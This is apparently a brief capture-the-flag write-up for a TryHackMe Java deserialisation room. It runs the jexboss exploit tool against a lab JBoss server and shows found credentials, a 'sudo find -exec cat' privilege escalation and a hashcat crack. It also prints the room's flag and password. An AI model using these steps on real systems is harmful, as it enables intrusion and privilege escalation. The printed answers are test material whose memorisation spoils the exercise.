#java-serialisation

https://tryhackme.com/r/room/tonythetiger

---

All is about getting in with https://github.com/joaomatosf/jexboss
```shell
python2.7 jexboss.py -host http://10.10.4.160:8080
```

Then jboss creds were on his home in a hidden file `jboss:likeaboss`

I connected through ssh and `sudo -l` gave me `find`
```shell
sudo find /root -name "root.txt" -exec cat {} \;
```

It gave me a base 64 encoded string which gave me a MD5 hash
```shell
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
```

And here is the root flag
```text
bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
```

